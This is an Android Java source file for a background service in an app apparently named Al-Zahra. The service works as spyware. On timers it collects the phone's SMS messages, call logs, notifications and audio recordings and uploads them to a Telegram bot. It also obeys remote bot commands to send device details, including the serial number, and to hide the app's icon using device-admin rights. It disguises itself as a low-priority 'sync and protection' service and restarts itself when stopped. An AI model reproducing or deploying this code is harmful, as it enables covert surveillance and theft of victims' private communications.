package com.alzahra.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import com.alzahra.R;
import com.alzahra.receivers.AdminReceiver;
import com.alzahra.telegram.TelegramArabicBot;
import com.alzahra.data.SMSCollector;
import com.alzahra.data.CallLogCollector;
import com.alzahra.data.NotificationCollector;

import org.json.JSONObject;

import java.io.File;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class CoreService extends Service {
    private static final String TAG = "CoreService";
    private static final String CHANNEL_ID = "alzahra_channel";
    
    private TelegramArabicBot bot;
    private ScheduledExecutorService scheduler;
    private SMSCollector smsCollector;
    private CallLogCollector callLogCollector;
    private NotificationCollector notificationCollector;
    private SharedPreferences prefs;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service created");
        
        prefs = getSharedPreferences("alzahra_settings", Context.MODE_PRIVATE);
        bot = new TelegramArabicBot(this);
        bot.start();
        
        smsCollector = new SMSCollector(this);
        callLogCollector = new CallLogCollector(this);
        notificationCollector = new NotificationCollector(this);
        
        createNotificationChannel();
        startForeground(1, buildNotification());
        startSync();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Al-Zahra Service",
                NotificationManager.IMPORTANCE_MIN
            );
            channel.setDescription("خدمة المزامنة والحماية");
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(getString(R.string.service_running))
            .setContentText(getString(R.string.service_description))
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setOngoing(true)
            .build();
    }

    private void startSync() {
        scheduler = Executors.newScheduledThreadPool(4);
        
        // Sync SMS every minute
        scheduler.scheduleAtFixedRate(() -> {
            if (prefs.getBoolean("sync_sms", true)) {
                File file = smsCollector.export();
                if (file != null) {
                    bot.uploadFile(file, "📨 **رسائل SMS**\\n🕐 " + 
                        java.text.DateFormat.getDateTimeInstance().format(new java.util.Date()));
                }
            }
        }, 5, 60, TimeUnit.SECONDS);
        
        // Sync calls every 5 minutes
        scheduler.scheduleAtFixedRate(() -> {
            if (prefs.getBoolean("sync_calls", true)) {
                File file = callLogCollector.export();
                if (file != null) {
                    bot.uploadFile(file, "📞 **سجل المكالمات**");
                }
            }
        }, 10, 5, TimeUnit.MINUTES);
        
        // Sync notifications every 30 seconds
        scheduler.scheduleAtFixedRate(() -> {
            if (prefs.getBoolean("sync_notifications", true)) {
                File file = notificationCollector.export();
                if (file != null) {
                    bot.uploadFile(file, "🔔 **الإشعارات الجديدة**");
                }
            }
        }, 15, 30, TimeUnit.SECONDS);
        
        // Process bot commands
        scheduler.scheduleAtFixedRate(this::processCommands, 0, 3, TimeUnit.SECONDS);
    }

    private void processCommands() {
        String cmd = bot.getNextCommand();
        if (cmd == null) return;
        
        Log.d(TAG, "Processing command: " + cmd);
        
        switch (cmd) {
            case "CMD_GET_DEVICES":
                sendDeviceList();
                break;
                
            case "CMD_GET_SMS":
                File smsFile = smsCollector.export();
                if (smsFile != null) bot.uploadFile(smsFile, "📨 **رسائل SMS**");
                else bot.sendMessage("❌ لا توجد رسائل SMS");
                break;
                
            case "CMD_GET_CALLS":
                File callsFile = callLogCollector.export();
                if (callsFile != null) bot.uploadFile(callsFile, "📞 **سجل المكالمات**");
                else bot.sendMessage("❌ لا توجد مكالمات");
                break;
                
            case "CMD_GET_NOTIFICATIONS":
                File notifFile = notificationCollector.export();
                if (notifFile != null) bot.uploadFile(notifFile, "🔔 **الإشعارات**");
                else bot.sendMessage("❌ لا توجد إشعارات");
                break;
                
            case "CMD_GET_WHATSAPP":
                bot.sendMessage("⏳ **جاري البحث عن بيانات واتساب...**\\n" +
                    "المسار: /sdcard/Android/media/com.whatsapp/");
                break;
                
            case "CMD_GET_MESSENGER":
                bot.sendMessage("⏳ **جاري البحث عن بيانات ماسنجر...**");
                break;
                
            case "CMD_GET_INFO":
                sendDeviceInfo();
                break;
                
            case "CMD_GET_RECORDINGS":
                sendRecordings();
                break;
                
            case "CMD_HIDE_APP":
                hideApp(true);
                break;
                
            case "CMD_UNHIDE_APP":
                hideApp(false);
                break;
        }
    }

    private void sendDeviceList() {
        String info = "📱 **الأجهزة المتصلة**\\n\\n" +
                "• الجهاز الحالي: " + android.os.Build.MODEL + "\\n" +
                "• المعالج: " + android.os.Build.HARDWARE + "\\n" +
                "• الرقم التسلسلي: " + android.os.Build.SERIAL + "\\n" +
                "• الحالة: ✅ متصل";
        bot.sendMessage(info);
    }

    private void sendDeviceInfo() {
        JSONObject info = new JSONObject();
        try {
            info.put("model", android.os.Build.MODEL);
            info.put("manufacturer", android.os.Build.MANUFACTURER);
            info.put("android_version", android.os.Build.VERSION.RELEASE);
            info.put("sdk", android.os.Build.VERSION.SDK_INT);
            info.put("hardware", android.os.Build.HARDWARE);
            info.put("serial", android.os.Build.SERIAL);
            
            // Battery info
            android.content.Intent battery = registerReceiver(null,
                new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED));
            int level = battery.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
            int scale = battery.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
            info.put("battery", (int)((level / (float)scale) * 100));
            
        } catch (Exception e) {
            Log.e(TAG, "Error building info", e);
        }
        
        bot.sendMessage("📱 **معلومات الجهاز**\\n```json\\n" + info.toString() + "\\n```");
    }

    private void sendRecordings() {
        File recDir = new File(getFilesDir(), "recordings");
        if (!recDir.exists() || recDir.listFiles().length == 0) {
            bot.sendMessage("❌ لا توجد تسجيلات حالياً");
            return;
        }
        
        File[] files = recDir.listFiles();
        bot.sendMessage("🎙️ **التسجيلات المتاحة:** " + files.length + " ملف");
        
        for (File file : files) {
            bot.uploadFile(file, "🎙️ تسجيل: " + file.getName());
        }
    }

    private void hideApp(boolean hide) {
        prefs.edit().putBoolean("app_hidden", hide).apply();
        
        DevicePolicyManager dpm = (DevicePolicyManager) 
            getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(this, AdminReceiver.class);
        
        try {
            if (dpm.isAdminActive(admin)) {
                dpm.setApplicationHidden(admin, getPackageName(), hide);
                bot.sendMessage(hide ? "🔒 **تم إخفاء التطبيق**" : 
                    "🔓 **تم إظهار التطبيق**");
            } else {
                bot.sendMessage("❌ صلاحية المسؤول غير مفعلة");
            }
        } catch (Exception e) {
            bot.sendMessage("❌ خطأ: " + e.getMessage());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (scheduler != null) {
            scheduler.shutdownNow();
        }
        // Restart service
        startService(new Intent(this, CoreService.class));
    }
}
